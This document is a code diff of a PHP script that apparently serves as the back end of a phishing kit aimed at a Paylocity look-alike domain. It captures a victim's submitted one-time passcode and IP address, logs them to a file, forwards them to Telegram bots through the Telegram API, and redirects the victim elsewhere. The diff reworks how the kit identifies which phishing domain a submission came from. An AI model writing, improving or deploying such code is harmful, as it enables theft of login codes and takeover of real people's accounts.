@@ -4,6 +4,7 @@
 // ===================================
 include 'firewall.php';
 
+// === Domain-specific bot + redirect map ===
 $site_map = [
     'paylocitylive.42web.io' => [
         'bots' => [
@@ -21,13 +22,15 @@ $site_map = [
     ]
 ];
 
-$log_file = 'submission_log.txt';
 
+// === Logger setup ===
+$log_file = 'submission_log.txt';
 function logToFile($data, $file) {
     $entry = "[" . date("Y-m-d H:i:s") . "] $data\n";
     file_put_contents($file, $entry, FILE_APPEND);
 }
 
+// === Telegram sender ===
 function sendToBots($message, $bots) {
     foreach ($bots as $bot) {
         $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
@@ -48,26 +51,29 @@ function sendToBots($message, $bots) {
     }
 }
 
+// === Main logic ===
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $otp = htmlspecialchars($_POST['userotp'] ?? '???');
     $ip  = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
-    $host = $_SERVER['HTTP_HOST'];
+    $referer = $_SERVER['HTTP_REFERER'] ?? '';
+    $parsed = parse_url($referer);
+    $domain = $parsed['host'] ?? 'unknown';
     $timestamp = date("Y-m-d H:i:s");
 
-    $msg = "🔐 *OTP Received from $host*\n\n" .
+    $msg = "🔐 *OTP Received from $domain*\n\n" .
            "🔢 *Code:* $otp\n" .
            "🌐 *IP:* $ip\n" .
            "⏰ *Time:* $timestamp";
 
-    logToFile("[$host] OTP: $otp | IP: $ip", $log_file);
+    logToFile("[$domain] OTP: $otp | IP: $ip", $log_file);
 
-    if (isset($site_map[$host])) {
-        $config = $site_map[$host];
+    if (isset($site_map[$domain])) {
+        $config = $site_map[$domain];
         sendToBots($msg, $config['bots']);
         header("Location: " . $config['redirect']);
         exit;
     } else {
-        logToFile("❌ Unauthorized domain: $host", $log_file);
+        logToFile("❌ Unauthorized domain: $domain", $log_file);
         exit("Unauthorized");
     }
 }
